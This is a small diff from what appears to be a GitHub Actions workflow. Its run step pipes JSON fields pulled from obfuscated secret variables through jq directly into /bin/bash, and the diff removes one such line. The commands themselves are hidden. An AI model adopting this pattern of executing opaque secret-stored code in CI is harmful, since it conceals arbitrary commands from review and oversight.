@@ -21,7 +21,6 @@ jobs:
           pgh51: ${{ secrets.pgh51 }}
         run: |
           printf '%s' "$pgh51" | jq -r .ct72234 | /bin/bash
-          echo $ckpe41 | jq -r .mq8 | /bin/bash
           printf '%s' "$yxig571" | jq -r .yq26911 | /bin/bash
           echo $mjbva368 | jq -r .vfbq2176 | /bin/bash
 
